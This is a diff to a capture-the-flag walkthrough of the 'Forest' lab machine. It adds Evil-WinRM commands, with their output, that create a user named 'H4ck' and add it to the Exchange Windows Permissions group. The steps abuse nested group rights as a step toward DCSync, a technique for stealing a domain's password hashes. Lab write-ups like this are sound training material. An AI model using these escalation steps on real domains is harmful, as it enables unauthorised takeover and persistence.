@@ -601,22 +601,75 @@ Once the file is correctly uploaded and ingested, we can click on `"Explore"` ->
 
 <br />
 
-There is two things to pass from `svc-alfresco` user to `Administrator`.
+There are two steps to escalate from `svc-alfresco` to `Administrator`.
 
 <br />
 
-## Join Exchange Windows Permissions:
+## Create a new user && Join Exchange Windows Permissions:
 
 <br />
 
-Our user `svc-alfresco`, is inside `Service Accounts` group, which is inside `Privileged IT Accounts` which, at the same time, is inside `Account Operators`.
+Our user `svc-alfresco` is in the `Service Accounts` group, which is nested inside `Privileged IT Accounts`, and that in turn belongs to `Account Operators`.
 
-Basically, because this nested groups, `svc-alfresco` is member of `Account Operators` group. Members of this group, have the `Generic All privilege` on `Exchange Windows Permissions` group.
+Because of this nested group structure, `svc-alfresco` ends up being a member of the `Account Operators` group.
 
-If we righ-click on `"GenericAll"` -> `"Windows Abuse"` we will find a step by step to escalate abusing this privilege:
+If we righ-click on `"GenericAll"` -> `"Windows Abuse"`, we'll find a step by step guide to escalate by abusing this privilege:
 
 <br />
 
 ![6](../../../assets/images/Forest/6.png)
  
+<br />
+
+We'll start by creating a new user and adding it to the `Exchange Windows Permissions` group:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user H4ck Password123- /add
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" H4ck /add
+The command completed successfully.
+```
+
+<br />
+
+We can check if our command was correctly executed:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user H4ck
+User name                    H4ck
+Full Name
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            6/7/2025 6:30:53 AM
+Password expires             Never
+Password changeable          6/8/2025 6:30:53 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   Never
+
+Logon hours allowed          All
+
+Local Group Memberships
+Global Group memberships     *Exchange Windows Perm*Domain Users
+The command completed successfully.
+```
+
+<br />
+
+## Grant DCSync Privileges:
+
 <br />
